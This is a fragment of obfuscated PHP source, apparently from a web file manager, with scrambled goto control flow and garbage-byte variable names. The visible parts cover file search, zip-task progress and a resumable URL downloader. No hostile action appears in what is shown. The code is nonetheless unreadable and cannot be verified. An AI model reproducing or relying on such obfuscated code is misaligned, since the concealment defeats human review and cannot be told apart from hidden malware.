$fÂÅŸË¯„), $EÈ‚•ÀŠ¢[89] => $EÈ‚•ÀŠ¢[405], $EÈ‚•ÀŠ¢[359] => array($EÈ‚•ÀŠ¢[759], $EÈ‚•ÀŠ¢[2204] . $C‹¾ŒŞÙ®[$EÈ‚•ÀŠ¢[2202]] . $EÈ‚•ÀŠ¢[2204])); goto D‡î•Œ‘É´; bøŞ¨†ï»ˆ: $EÈ‚•ÀŠ¢ =& $_SERVER[¬ˆÚÂ”Éğä]; if (!$C‹¾ŒŞÙ®[$EÈ‚•ÀŠ¢[2202]] || $B·‘ª¹½¥[$EÈ‚•ÀŠ¢[351]][$EÈ‚•ÀŠ¢[340]] > 1) { return; } $fÂÅŸË¯„ = $this->listSearchChildren($C‹¾ŒŞÙ®[$EÈ‚•ÀŠ¢[463]]); goto f«ÔĞã¢»Ï; bµğÙŸ¿í: } private function _listSearchGroupTag(&$e¥Æ°”‘˜, $DÊñĞŸÂ, $BëÓ§’·Û) { goto d³‡ø»­©; C•µÚºƒ›: $FŒ—Ÿœ²£Ä = array_to_keyvalue($FŒ—Ÿœ²£Ä, $b°²¦ˆ¨ìó[33], $b°²¦ˆ¨ìó[75]); $bØÜÊ²Ò¶² = array_unique($FŒ—Ÿœ²£Ä); $this->_listSearchMerge($e¥Æ°”‘˜, $DÊñĞŸÂ, $BëÓ§’·Û, $bØÜÊ²Ò¶²); goto a½ãÔ¦”¢†; f²µ¶£Â¼: $EÑ×©ÑÙÜ† = array(); $B¡ÔÃŞË× = $DÊñĞŸÂ[$b°²¦ˆ¨ìó[2202]]; foreach ($eøÉ„±…á¼[$b°²¦ˆ¨ìó[354]] as $CŠ­†ØŒ‰²) { $Aè‘»°Ğ£¸ = $CŠ­†ØŒ‰²[$b°²¦ˆ¨ìó[28]]; $FŞ“ƒŠÌ×å = str_replace($b°²¦ˆ¨ìó[50], $b°²¦ˆ¨ìó[33], Pinyin::encode($Aè‘»°Ğ£¸)); if (stripos($Aè‘»°Ğ£¸, $B¡ÔÃŞË×) !== !1 || stripos($FŞ“ƒŠÌ×å, $B¡ÔÃŞË×) !== !1) { $EÑ×©ÑÙÜ†[] = $CŠ­†ØŒ‰²[$b°²¦ˆ¨ìó[367]]; } } goto CÑÄ„åÙŒø; d³‡ø»­©: $b°²¦ˆ¨ìó =& $_SERVER[¬ˆÚÂ”Éğä]; if (!$DÊñĞŸÂ[$b°²¦ˆ¨ìó[2202]] || $e¥Æ°”‘˜[$b°²¦ˆ¨ìó[351]][$b°²¦ˆ¨ìó[340]] > 1 || !$DÊñĞŸÂ[$b°²¦ˆ¨ìó[463]]) { return; } $b”…ßôöâß = $this->sourceInfo($DÊñĞŸÂ[$b°²¦ˆ¨ìó[463]]); goto c¢ÅÎá‰; c¢ÅÎá‰: if (!$b”…ßôöâß || $b”…ßôöâß[$b°²¦ˆ¨ìó[371]] != SourceModel::TYPE_GROUP) { return; } $A…¡ïÜ÷Û = $b”…ßôöâß[$b°²¦ˆ¨ìó[458]]; $eøÉ„±…á¼ = Model($b°²¦ˆ¨ìó[2361])->get($A…¡ïÜ÷Û); goto f²µ¶£Â¼; CÑÄ„åÙŒø: if (!$EÑ×©ÑÙÜ†) { return; } $a‡¡ÈÎÂŠ = array($b°²¦ˆ¨ìó[393] => array($b°²¦ˆ¨ìó[7], $EÑ×©ÑÙÜ†), $b°²¦ˆ¨ìó[1450] => 0, $b°²¦ˆ¨ìó[29] => $b°²¦ˆ¨ìó[2222] . $A…¡ïÜ÷Û); $FŒ—Ÿœ²£Ä = Model($b°²¦ˆ¨ìó[394])->field($b°²¦ˆ¨ìó[75])->where($a‡¡ÈÎÂŠ)->select(); goto C•µÚºƒ›; a½ãÔ¦”¢†: } private function _listSearchMerge(&$E–ƒõ‹§¢¢, $d‚­µÊ§áË, $A¶ÎÈŞÍ¿, $DÏ×ÇÖ…ß¿) { goto eÄÍ©‡ãõå; EÓêÛõ‘î†: $c°ˆšØƒ“ = array_diff($DÏ×ÇÖ…ß¿, $cîğ²´äŞÆ); if (!$c°ˆšØƒ“) { return; } $bßğ¸Ö¥¦Õ = array($EÕ–¶ Î’[369] => array($EÕ–¶ Î’[7], $c°ˆšØƒ“)); goto c´£º„¨; aÜˆÅÀÛ: foreach ($a‚Û†Èñ³ó as $d¢Ñ‰»ÉãÛ) { $e´µ®…ŠŞì = $EÕ–¶ Î’[47] . $d‚­µÊ§áË[$EÕ–¶ Î’[463]] . $EÕ–¶ Î’[47]; if (stripos($d¢Ñ‰»ÉãÛ[$EÕ–¶ Î’[461]], $e´µ®…ŠŞì) !== !1) { $d§Ö„Úã÷[] = $d¢Ñ‰»ÉãÛ; } } $E–ƒõ‹§¢¢[$EÕ–¶ Î’[354]] = array_merge($d§Ö„Úã÷, $E–ƒõ‹§¢¢[$EÕ–¶ Î’[354]]); $E–ƒõ‹§¢¢[$EÕ–¶ Î’[351]][$EÕ–¶ Î’[352]] += count($d§Ö„Úã÷); goto e±„ÀğõÜ; eÄÍ©‡ãõå: $EÕ–¶ Î’ =& $_SERVER[¬ˆÚÂ”Éğä]; if (!$DÏ×ÇÖ…ß¿) { return; } $cîğ²´äŞÆ = array_to_keyvalue($E–ƒõ‹§¢¢[$EÕ–¶ Î’[354]], $EÕ–¶ Î’[33], $EÕ–¶ Î’[369]); goto EÓêÛõ‘î†; c´£º„¨: $a‚Û†Èñ³ó = $this->field($A¶ÎÈŞÍ¿)->where($bßğ¸Ö¥¦Õ)->select(); if (!$a‚Û†Èñ³ó) { return; } $d§Ö„Úã÷ = array(); goto aÜˆÅÀÛ; e±„ÀğõÜ: } public function listSearchChildren($dåÖéÔ¢Û®, $B‡ôª»í¼  = 5000) { goto DÑ‚Ù’; Dö¼öÜ£»: $Fó×ãáÆÆÇ = $this->field($eÇàÙ©Øè…[369])->where($Eƒï‰ÉÎ„)->select(); $cÌ•Ø÷“÷é = array_to_keyvalue($Fó×ãáÆÆÇ, $eÇàÙ©Øè…[33], $eÇàÙ©Øè…[369]); return $cÌ•Ø÷“÷é; goto eĞØÒĞ’Êİ; cÏÏ…÷±á: $Eƒï‰ÉÎ„ = array($eÇàÙ©Øè…[461] => array($eÇàÙ©Øè…[759], $D¡Ôáã«ºŸ[$eÇàÙ©Øè…[461]] . $D¡Ôáã«ºŸ[$eÇàÙ©Øè…[369]] . $eÇàÙ©Øè…[486])); $E…¥±ÂîáŒ = $this->field($eÇàÙ©Øè…[369])->cache(null, 600)->where($Eƒï‰ÉÎ„)->count(); if ($E…¥±ÂîáŒ > $B‡ôª»í¼ ) { return $this->_listSearchChildrenNear($dåÖéÔ¢Û®, $B‡ôª»í¼ ); } goto Dö¼öÜ£»; DÑ‚Ù’: $eÇàÙ©Øè… =& $_SERVER[¬ˆÚÂ”Éğä]; $cÌ•Ø÷“÷é = array(); $D¡Ôáã«ºŸ = $this->sourceInfo($dåÖéÔ¢Û®); goto cÏÏ…÷±á; eĞØÒĞ’Êİ: } private function _listSearchChildrenNear($ešóáÙŠ±…, $E¦ùêò¤¢™) { goto b½Û½±ï®ø; Dõ±ï¤ñÛ–: $Fô™ĞéÔŠ… = array_merge($Fô™ĞéÔŠ…, array_to_keyvalue($DØÑŞøõæ…, $A‚Åø¼¯˜Æ[33], $A‚Åø¼¯˜Æ[369])); $Fô™ĞéÔŠ… = array_slice($Fô™ĞéÔŠ…, 0, $E¦ùêò¤¢™); return $Fô™ĞéÔŠ…; goto f¼œ”ÙêÕğ; b½Û½±ï®ø: $A‚Åø¼¯˜Æ =& $_SERVER[¬ˆÚÂ”Éğä]; $Fô™ĞéÔŠ… = array(); $bóÓˆÌêÔÚ = array($A‚Åø¼¯˜Æ[463] => $ešóáÙŠ±…); goto f…ÃÄÓŒè; f…ÃÄÓŒè: $DØÑŞøõæ… = $this->field($A‚Åø¼¯˜Æ[2362])->where($bóÓˆÌêÔÚ)->select(); $A¼¡Ü˜µÊÖ = array_to_keyvalue(array_filter_by_field($DØÑŞøõæ…, $A‚Åø¼¯˜Æ[370], $A‚Åø¼¯˜Æ[83]), $A‚Åø¼¯˜Æ[33], $A‚Åø¼¯˜Æ[369]); $Fô™ĞéÔŠ… = array_merge($Fô™ĞéÔŠ…, array_to_keyvalue($DØÑŞøõæ…, $A‚Åø¼¯˜Æ[33], $A‚Åø¼¯˜Æ[369])); goto eÌ²ù‡ÈÉ; eÌ²ù‡ÈÉ: if (!$A¼¡Ü˜µÊÖ) { return $Fô™ĞéÔŠ…; } $bóÓˆÌêÔÚ = array($A‚Åø¼¯˜Æ[463] => array($A‚Åø¼¯˜Æ[7], $A¼¡Ü˜µÊÖ)); $DØÑŞøõæ… = $this->field($A‚Åø¼¯˜Æ[2362])->where($bóÓˆÌêÔÚ)->select(); goto Dõ±ï¤ñÛ–; f¼œ”ÙêÕğ: } private function _listSearchBindPinyin($ašØ–’—÷Å, &$BÊ×½È»¶, &$B¿Û´Å‰‚ó) { goto b™ÔŒí®; D±¹´¬‘°: unset($BÊ×½È»¶[$a…›¢¹†¸[28]]); foreach ($BÊ×½È»¶ as $B©Ï‘ªá„¡ => $d„¡Ë’­¿¥) { $d‘‚ŸÂŞ[$a…›¢¹†¸[2364] . $B©Ï‘ªá„¡] = $d„¡Ë’­¿¥; } $BŸ…œÔõá„ = array($a…›¢¹†¸[485], $a…›¢¹†¸[2204] . $ašØ–’—÷Å[$a…›¢¹†¸[2202]] . $a…›¢¹†¸[2204]); goto Dô²­è¨‘Î; BËÆ°ùƒÌé: $d‘‚ŸÂŞ = array(); $B¿Û´Å‰‚ó = str_replace(array($a…›¢¹†¸[217], $a…›¢¹†¸[50], $a…›¢¹†¸[2363]), $a…›¢¹†¸[33], $B¿Û´Å‰‚ó); $B¿Û´Å‰‚ó = $a…›¢¹†¸[2364] . str_replace($a…›¢¹†¸[47], $a…›¢¹†¸[2365], $B¿Û´Å‰‚ó); goto D±¹´¬‘°; b™ÔŒí®: $a…›¢¹†¸ =& $_SERVER[¬ˆÚÂ”Éğä]; if (!Input::check($ašØ–’—÷Å[$a…›¢¹†¸[2202]], $a…›¢¹†¸[306]) || strlen($ašØ–’—÷Å[$a…›¢¹†¸[2202]]) < 2) { return; } $aøêäŸä¿ = "\114\x45\x46\124\40\112\x4f\111\x4e\40{$this->tablePrefix}\151\157\x5f\163\157\x75\x72\x63\x65\137\x6d\x65\x74\141\40\155\145\x74\141\x20\157\x6e\x20\x73\x6f\165\162\143\145\56\x73\157\x75\162\x63\x65\x49\x44\x20\x3d\40\155\145\x74\x61\56\x73\157\x75\x72\143\145\x49\x44"; goto BËÆ°ùƒÌé; Dô²­è¨‘Î: $d‘‚ŸÂŞ[] = array($a…›¢¹†¸[2366] => $BŸ…œÔõá„, $a…›¢¹†¸[926] => $a…›¢¹†¸[2206], array($a…›¢¹†¸[2367] => $BŸ…œÔõá„, $a…›¢¹†¸[2368] => array($a…›¢¹†¸[7], array($a…›¢¹†¸[416], $a…›¢¹†¸[415])))); $this->join($aøêäŸä¿); $BÊ×½È»¶ = $d‘‚ŸÂŞ; goto F‹²è“¾‘; F‹²è“¾‘: } private function _parseSearchWhere($A›´‚“ŒÙÇ) { goto Cº¿‘‡©Ò; cÌæ÷‰¦‰: if (isset($A›´‚“ŒÙÇ[$DØÆ¥Ò®¦‰[2202]]) && $A›´‚“ŒÙÇ[$DØÆ¥Ò®¦‰[2202]]) { $Bƒ¤Áì†¸± = $A›´‚“ŒÙÇ[$DØÆ¥Ò®¦‰[2202]]; $bÁ½‡·ÂÂ = explode($DØÆ¥Ò®¦‰[50], $Bƒ¤Áì†¸±); if (strlen($Bƒ¤Áì†¸±) > 2 && (substr($Bƒ¤Áì†¸±, 0, 1) == $DØÆ¥Ò®¦‰[113] && substr($Bƒ¤Áì†¸±, -1) == $DØÆ¥Ò®¦‰[113]) || substr($Bƒ¤Áì†¸±, 0, 1) == $DØÆ¥Ò®¦‰[55] && substr($Bƒ¤Áì†¸±, -1) == $DØÆ¥Ò®¦‰[55]) { $Bƒ¤Áì†¸± = substr($Bƒ¤Áì†¸±, 1, -1); $bÁ½‡·ÂÂ = array($Bƒ¤Áì†¸±); } $aŒèò‡¸‡[$DØÆ¥Ò®¦‰[28]] = array($DØÆ¥Ò®¦‰[485], $DØÆ¥Ò®¦‰[2204] . $Bƒ¤Áì†¸± . $DØÆ¥Ò®¦‰[2204]); if (count($bÁ½‡·ÂÂ) > 1) { $aŒèò‡¸‡[$DØÆ¥Ò®¦‰[28]] = array(); foreach ($bÁ½‡·ÂÂ as $ağ¿ã³Ö£) { if (!trim($ağ¿ã³Ö£)) { continue; } $aŒèò‡¸‡[$DØÆ¥Ò®¦‰[28]][] = array($DØÆ¥Ò®¦‰[485], $DØÆ¥Ò®¦‰[2204] . trim($ağ¿ã³Ö£) . $DØÆ¥Ò®¦‰[2204]); } } } return $aŒèò‡¸‡; goto bï——ôĞ©‘; A‚ò†à³õ´: if (isset($A›´‚“ŒÙÇ[$DØÆ¥Ò®¦‰[537]])) { $aŒèò‡¸‡[] = array($DØÆ¥Ò®¦‰[379] => $A›´‚“ŒÙÇ[$DØÆ¥Ò®¦‰[537]], $DØÆ¥Ò®¦‰[378] => $A›´‚“ŒÙÇ[$DØÆ¥Ò®¦‰[537]], $DØÆ¥Ò®¦‰[926] => $DØÆ¥Ò®¦‰[2206]); } if (isset($A›´‚“ŒÙÇ[$DØÆ¥Ò®¦‰[372]])) { $e×ˆ•‡¸ê¦ = $A›´‚“ŒÙÇ[$DØÆ¥Ò®¦‰[372]]; if ($e×ˆ•‡¸ê¦ == $DØÆ¥Ò®¦‰[76]) { $aŒèò‡¸‡[$DØÆ¥Ò®¦‰[370]] = 1; } else { if ($e×ˆ•‡¸ê¦ == $DØÆ¥Ò®¦‰[2374]) { $aŒèò‡¸‡[$DØÆ¥Ò®¦‰[370]] = 0; } else { if ($e×ˆ•‡¸ê¦) { $e×ˆ•‡¸ê¦ = is_array($e×ˆ•‡¸ê¦) ? $e×ˆ•‡¸ê¦ : explode($DØÆ¥Ò®¦‰[47], $e×ˆ•‡¸ê¦); $aŒèò‡¸‡[$DØÆ¥Ò®¦‰[372]] = array($DØÆ¥Ò®¦‰[384], $e×ˆ•‡¸ê¦); $aŒèò‡¸‡[$DØÆ¥Ò®¦‰[370]] = 0; } } } } if (isset($A›´‚“ŒÙÇ[$DØÆ¥Ò®¦‰[463]])) { $då†ŒÁ·ÀÊ = $this->sourceInfo($A›´‚“ŒÙÇ[$DØÆ¥Ò®¦‰[463]]); $aŒèò‡¸‡[$DØÆ¥Ò®¦‰[527]] = array($DØÆ¥Ò®¦‰[485], $då†ŒÁ·ÀÊ[$DØÆ¥Ò®¦‰[461]] . $A›´‚“ŒÙÇ[$DØÆ¥Ò®¦‰[463]] . $DØÆ¥Ò®¦‰[486]); } goto cÌæ÷‰¦‰; A¾³¬ñÊ…: if (isset($A›´‚“ŒÙÇ[$DØÆ¥Ò®¦‰[449]])) { $b¥ùŠ¢÷ = array($DØÆ¥Ò®¦‰[2370], $A›´‚“ŒÙÇ[$DØÆ¥Ò®¦‰[449]]); if ($aŒèò‡¸‡[$DØÆ¥Ò®¦‰[107]]) { $aŒèò‡¸‡[$DØÆ¥Ò®¦‰[107]] = array($aŒèò‡¸‡[$DØÆ¥Ò®¦‰[107]], $b¥ùŠ¢÷, $DØÆ¥Ò®¦‰[2371]); } else { $aŒèò‡¸‡[$DØÆ¥Ò®¦‰[107]] = $b¥ùŠ¢÷; } } if (isset($A›´‚“ŒÙÇ[$DØÆ¥Ò®¦‰[2372]])) { $aŒèò‡¸‡[$DØÆ¥Ò®¦‰[77]] = array($DØÆ¥Ò®¦‰[2369], $A›´‚“ŒÙÇ[$DØÆ¥Ò®¦‰[2372]]); } if (isset($A›´‚“ŒÙÇ[$DØÆ¥Ò®¦‰[2373]])) { $b¥ùŠ¢÷ = array($DØÆ¥Ò®¦‰[2370], $A›´‚“ŒÙÇ[$DØÆ¥Ò®¦‰[2373]]); if ($aŒèò‡¸‡[$DØÆ¥Ò®¦‰[77]]) { $aŒèò‡¸‡[$DØÆ¥Ò®¦‰[77]] = array($aŒèò‡¸‡[$DØÆ¥Ò®¦‰[77]], $b¥ùŠ¢÷, $DØÆ¥Ò®¦‰[2371]); } else { $aŒèò‡¸‡[$DØÆ¥Ò®¦‰[77]] = $b¥ùŠ¢÷; } } goto A‚ò†à³õ´; Cº¿‘‡©Ò: $DØÆ¥Ò®¦‰ =& $_SERVER[¬ˆÚÂ”Éğä]; $aŒèò‡¸‡ = array(); if (isset($A›´‚“ŒÙÇ[$DØÆ¥Ò®¦‰[710]])) { $aŒèò‡¸‡[$DØÆ¥Ò®¦‰[107]] = array($DØÆ¥Ò®¦‰[2369], $A›´‚“ŒÙÇ[$DØÆ¥Ò®¦‰[710]]); } goto A¾³¬ñÊ…; bï——ôĞ©‘: } } goto Dæ¯‰œË¼°; cåÁÄØº—´: class TaskZip extends TaskFileTransfer { protected function startAfter() { $b‰˜›Œ‹°ä =& $_SERVER[¬ˆÚÂ”Éğä]; parent::startAfter(); Hook::bind($b‰˜›Œ‹°ä[1526], array($this, $b‰˜›Œ‹°ä[1521])); $Cõïá±Šˆ =& $this->task; $Cõïá±Šˆ[$b‰˜›Œ‹°ä[1523]] = $b‰˜›Œ‹°ä[1053]; if (!$Cõïá±Šˆ[$b‰˜›Œ‹°ä[1356]]) { $Cõïá±Šˆ[$b‰˜›Œ‹°ä[1356]] = LNG($b‰˜›Œ‹°ä[1527]); } } protected function endAfter() { $A³Á¡ÎÔŠ÷ =& $_SERVER[¬ˆÚÂ”Éğä]; parent::endAfter(); Hook::unbind($A³Á¡ÎÔŠ÷[1526], array($this, $A³Á¡ÎÔŠ÷[1521])); } public function updateAfter() { $fæçÀ»ŠÚ‹ =& $_SERVER[¬ˆÚÂ”Éğä]; $cì¸…µâ¯ =& $this->task; if (!$cì¸…µâ¯[$fæçÀ»ŠÚ‹[989]] || !$cì¸…µâ¯[$fæçÀ»ŠÚ‹[706]]) { return; } if ($cì¸…µâ¯[$fæçÀ»ŠÚ‹[1523]] == $fæçÀ»ŠÚ‹[1053]) { $CÛà¡Åíæ = $cì¸…µâ¯[$fæçÀ»ŠÚ‹[1496]]; if ($cì¸…µâ¯[$fæçÀ»ŠÚ‹[1497]] != $fæçÀ»ŠÚ‹[1053]) { $CÛà¡Åíæ = 0; } $D§¹ Ê…¨í = ($cì¸…µâ¯[$fæçÀ»ŠÚ‹[1500]] + $CÛà¡Åíæ) / $cì¸…µâ¯[$fæçÀ»ŠÚ‹[706]]; $cì¸…µâ¯[$fæçÀ»ŠÚ‹[1451]] = $D§¹ Ê…¨í * 0.3; } else { if ($cì¸…µâ¯[$fæçÀ»ŠÚ‹[1523]] == $fæçÀ»ŠÚ‹[301]) { $D§¹ Ê…¨í = $cì¸…µâ¯[$fæçÀ»ŠÚ‹[1003]] / $cì¸…µâ¯[$fæçÀ»ŠÚ‹[989]]; $cì¸…µâ¯[$fæçÀ»ŠÚ‹[1451]] = 0.3 + $D§¹ Ê…¨í * 0.5; } else { if ($cì¸…µâ¯[$fæçÀ»ŠÚ‹[1523]] == $fæçÀ»ŠÚ‹[103]) { $D§¹ Ê…¨í = 0; if ($cì¸…µâ¯[$fæçÀ»ŠÚ‹[1495]]) { $D§¹ Ê…¨í = $cì¸…µâ¯[$fæçÀ»ŠÚ‹[1496]] / $cì¸…µâ¯[$fæçÀ»ŠÚ‹[1495]]; } $cì¸…µâ¯[$fæçÀ»ŠÚ‹[1451]] = 0.3 + 0.5 + $D§¹ Ê…¨í * 0.2; } } } if ($cì¸…µâ¯[$fæçÀ»ŠÚ‹[1451]] > 0) { $FéÄ ÎÆ—ö = timeFloat() - $cì¸…µâ¯[$fæçÀ»ŠÚ‹[1453]] - $cì¸…µâ¯[$fæçÀ»ŠÚ‹[1456]]; $cì¸…µâ¯[$fæçÀ»ŠÚ‹[1457]] = $FéÄ ÎÆ—ö * (1 - $cì¸…µâ¯[$fæçÀ»ŠÚ‹[1451]]) / $cì¸…µâ¯[$fæçÀ»ŠÚ‹[1451]]; } } public function copyFileStart($cˆÛˆÒñœ½, $d²ùĞ˜øË¶, $F…İÏÃø‚Â, $bÒ¼³™à½’, $Bãá——õáŸ, $Cµ˜‹³¤Ş‘) { $DÔíÖÍç§¢ =& $_SERVER[¬ˆÚÂ”Éğä]; parent::copyFileStart($cˆÛˆÒñœ½, $d²ùĞ˜øË¶, $F…İÏÃø‚Â, $bÒ¼³™à½’, $Bãá——õáŸ, $Cµ˜‹³¤Ş‘); $a‚•×øÎø… =& $this->task; if ($a‚•×øÎø…[$DÔíÖÍç§¢[1523]] == $DÔíÖÍç§¢[301]) { $a‚•×øÎø…[$DÔíÖÍç§¢[1523]] = $DÔíÖÍç§¢[103]; } $this->update(); } public function copyFileEnd($C×Òå‰”É, $b¯ñ®Š‚®ñ, $DÔî×« ×„, $BÁá„Ë™ã§, $C¸Ì†Ó•Ì«, $A«æ¡ŞÛ—¼) { $bªœÜñ§ÀÄ =& $_SERVER[¬ˆÚÂ”Éğä]; $c‚Üãˆ›Ş =& $this->task; $c‚Üãˆ›Ş[$bªœÜñ§ÀÄ[1496]] = $c‚Üãˆ›Ş[$bªœÜñ§ÀÄ[1495]]; $c‚Üãˆ›Ş[$bªœÜñ§ÀÄ[1500]] += $c‚Üãˆ›Ş[$bªœÜñ§ÀÄ[1495]]; $c‚Üãˆ›Ş[$bªœÜñ§ÀÄ[1497]] = $bªœÜñ§ÀÄ[33]; $this->update(); } public function nameParse($Fà™åêóÏğ) { $B‹Îï›™ß‡ =& $_SERVER[¬ˆÚÂ”Éğä]; $D¬ÔÃ¿ÒÛ =& $this->task; if ($D¬ÔÃ¿ÒÛ[$B‹Îï›™ß‡[1003]] < $D¬ÔÃ¿ÒÛ[$B‹Îï›™ß‡[989]]) { $aĞŠ˜ÙÜ¢¶ = get_path_this($Fà™åêóÏğ); if (strstr($aĞŠ˜ÙÜ¢¶, $B‹Îï›™ß‡[91])) { $D¬ÔÃ¿ÒÛ[$B‹Îï›™ß‡[1003]] += 1; } } if ($D¬ÔÃ¿ÒÛ[$B‹Îï›™ß‡[1523]] == $B‹Îï›™ß‡[1053]) { $D¬ÔÃ¿ÒÛ[$B‹Îï›™ß‡[1523]] = $B‹Îï›™ß‡[301]; } $D¬ÔÃ¿ÒÛ[$B‹Îï›™ß‡[1493]] = $Fà™åêóÏğ; $this->update(); } } class Downloader { static function start($Dã¶”Ä§†, $DÚÇ´ÃÊ, $eÓÎÈÕ¤‹Ï = 10) { goto F´„ùÙÓÜî; d¿£ŠôƒÃÃ: if ($CÇóÔò²œó[$eŒªß×‚ˆØ[1045]]) { @unlink($b¤ÂÛ”Öß); } return $CÇóÔò²œó; goto DàèÂŒÜàø; aÀ¨öºÈ: $d–ì­íà™ = $DÚÇ´ÃÊ . $eŒªß×‚ˆØ[1529]; if (is_array($Dã¶”Ä§†)) { $DĞ°á‰·Õ“ = $Dã¶”Ä§†; } else { $DĞ°á‰·Õ“ = url_header($Dã¶”Ä§†); } $Dã¶”Ä§† = $DĞ°á‰·Õ“[$eŒªß×‚ˆØ[295]]; goto c½•ÛÜÍ Â; c½•ÛÜÍ Â: if (!$Dã¶”Ä§†) { return array($eŒªß×‚ˆØ[1045] => !1, $eŒªß×‚ˆØ[1047] => $eŒªß×‚ˆØ[1050]); } if (!$DĞ°á‰·Õ“[$eŒªß×‚ˆØ[1301]] || $DĞ°á‰·Õ“[$eŒªß×‚ˆØ[325]] == 0) { @unlink($d–ì­íà™); @unlink($DÚÇ´ÃÊ); $CÇóÔò²œó = self::fileDownloadFopen($Dã¶”Ä§†, $DÚÇ´ÃÊ, $DĞ°á‰·Õ“[$eŒªß×‚ˆØ[325]]); if ($CÇóÔò²œó[$eŒªß×‚ˆØ[1045]]) { return $CÇóÔò²œó; } else { @unlink($d–ì­íà™); @unlink($DÚÇ´ÃÊ); $CÇóÔò²œó = self::fileDownloadCurl($Dã¶”Ä§†, $DÚÇ´ÃÊ, !1, 0, $DĞ°á‰·Õ“[$eŒªß×‚ˆØ[325]]); @unlink($d–ì­íà™); return $CÇóÔò²œó; } } $EŠ˜ë‰ŠŞé = is_file($d–ì­íà™) ? filesize($d–ì­íà™) : 0; goto A±Ã¨´Ã†¡; Fæ¡ß¹¶Úí: if ($EŠ˜ë‰ŠŞé > $cÌ”Ï·³) { @unlink($d–ì­íà™); } file_put_contents($b¤ÂÛ”Öß, json_encode($Fù”›å¶ÓØ)); $CÇóÔò²œó = self::fileDownloadCurl($Dã¶”Ä§†, $DÚÇ´ÃÊ, !0, $EŠ˜ë‰ŠŞé, $cÌ”Ï·³); goto d¿£ŠôƒÃÃ; dÅ¢ß¤‚‚Ï: if (is_file($b¤ÂÛ”Öß)) { $Eì¶ù«êÉÃ = file_get_contents($b¤ÂÛ”Öß); $Fù”›å¶ÓØ = json_decode($Eì¶ù«êÉÃ, 1); } if (file_exists($DÚÇ´ÃÊ) && $cÌ”Ï·³ == filesize($DÚÇ´ÃÊ)) { @unlink($d–ì­íà™); @unlink($b¤ÂÛ”Öß); return array($eŒªß×‚ˆØ[1045] => !0, $eŒªß×‚ˆØ[1047] => $eŒªß×‚ˆØ[1531]); } if ($Fù”›å¶ÓØ[$eŒªß×‚ˆØ[325]] != $cÌ”Ï·³) { $Fù”›å¶ÓØ = array($eŒªß×‚ˆØ[325] => $cÌ”Ï·³); } goto Fæ¡ß¹¶Úí; F´„ùÙÓÜî: $eŒªß×‚ˆØ =& $_SERVER[¬ˆÚÂ”Éğä]; if (!request_url_safe($Dã¶”Ä§†)) { return array($eŒªß×‚ˆØ[1045] => !1, $eŒªß×‚ˆØ[1047] => $eŒªß×‚ˆØ[1050]); } $b¤ÂÛ”Öß = $DÚÇ´ÃÊ . $eŒªß×‚ˆØ[1528]; goto aÀ¨öºÈ; A±Ã¨´Ã†¡: $cÌ”Ï·³ = intval($DĞ°á‰·Õ“[$eŒªß×‚ˆØ[325]]); if (file_exists($d–ì­íà™) && time() - filemtime($d–ì­íà™) < 3) { return array($eŒªß×‚ˆØ[1045] => !1, $eŒªß×‚ˆØ[1047] => $eŒªß×‚ˆØ[1530]); } $Fù”›å¶ÓØ = array(); goto dÅ¢ß¤‚‚Ï; DàèÂŒÜàø: } static function fileDownloadFopen($fë‚•‰ôì, $cêË‘ìÊÀ–, $eŞ÷‘ùµÊø = 0) { $Aö¨Á¿ˆùÑ =& $_SERVER[¬ˆÚÂ”Éğä]; @ini_set($Aö¨Á¿ˆùÑ[1532], $Aö¨Á¿ˆùÑ[1533]); $côÙò¯Ëá = $cêË‘ìÊÀ– . $Aö¨Á¿ˆùÑ[1529]; set_timeout(); @unlink($côÙò¯Ëá); if ($f÷¸©‡öÌì = @fopen($fë‚•‰ôì, $Aö¨Á¿ˆùÑ[1534])) { goto cÍöîÜš–; DÅÛ²öÔ´ã: return array($Aö¨Á¿ˆùÑ[1045] => !0, $Aö¨Á¿ˆùÑ[1047] => $Aö¨Á¿ˆùÑ[704]); goto aÛçœÈ”Ü; cÍöîÜš–: if (!($bç¬ÛÏŞÖ¥ = @fopen($côÙò¯Ëá, $Aö¨Á¿ˆùÑ[1535]))) { return array($Aö¨Á¿ˆùÑ[1045] => !1, $Aö¨Á¿ˆùÑ[1047] => $Aö¨Á¿ˆùÑ[1536]); } while (!feof($f÷¸©‡öÌì)) { if (!file_exists($côÙò¯Ëá)) { fclose($bç¬ÛÏŞÖ¥); return array($Aö¨Á¿ˆùÑ[1045] => !1, $Aö¨Á¿ˆùÑ[1047] => $Aö¨Á¿ˆùÑ[1537]); } clearstatcache(); if ($eŞ÷‘ùµÊø > 0 && $eŞ÷‘ùµÊø == filesize(iconv_system($côÙò¯Ëá))) { break; } fwrite($bç¬ÛÏŞÖ¥, fread($f÷¸©‡öÌì, 1024 * 8), 1024 * 8); } fclose($bç¬ÛÏŞÖ¥); goto CŒÒîŒŒ›Æ; CŒÒîŒŒ›Æ: fclose($f÷¸©‡öÌì); self::checkGzip($côÙò¯Ëá); if (!@rename($côÙò¯Ëá, $cêË‘ìÊÀ–)) { usleep(round(rand(0, 1000) * 50)); @unlink($cêË‘ìÊÀ–); $F‘­¨—Ü¶ = @rename($côÙò¯Ëá, $cêË‘ìÊÀ–); if (!$F‘­¨—Ü¶) { return array($Aö¨Á¿ˆùÑ[1045] => !1, $Aö¨Á¿ˆùÑ[1047] => $Aö¨Á¿ˆùÑ[1538]); } } goto DÅÛ²öÔ´ã; aÛçœÈ”Ü: } else { return array($Aö¨Á¿ˆùÑ[1045] => !1, $Aö¨Á¿ˆùÑ[1047] => $Aö¨Á¿ˆùÑ[1539]); } } static function fileDownloadCurl($e“‰ÁŒê§, $a³¼èÇšœ, $cå¿Ø‚Çë­ = false, $Dƒ­÷Œ¥ë = 0, $bö“›§¼ø¨ = 0) { goto fËô²òè’; f‹¥æŸÊÇ: $f¬Ö²øÈØØ = @fopen($c£‰óÔø­œ, $aÖîŞÀµº°[993]); if (!$f¬Ö²øÈØØ) { return array($aÖîŞÀµº°[1045] => !1, $aÖîŞÀµº°[1047] => $aÖîŞÀµº°[1540]); } $eŠˆëõ—Ù = curl_init($e“‰ÁŒê§); goto Dœ¶Ëœé‰; Dœ¶Ëœé‰: if ($cå¿Ø‚Çë­) { curl_setopt($eŠˆëõ—Ù, CURLOPT_RANGE, $Dƒ­÷Œ¥ë . $aÖîŞÀµº°[723]); } curl_setopt($eŠˆëõ—Ù, CURLOPT_FILE, $f¬Ö²øÈØØ); curl_setopt($eŠˆëõ—Ù, CURLOPT_REFERER, get_url_link($e“‰ÁŒê§)); goto F„ìè•á˜Æ; fËô²òè’: $aÖîŞÀµº° =& 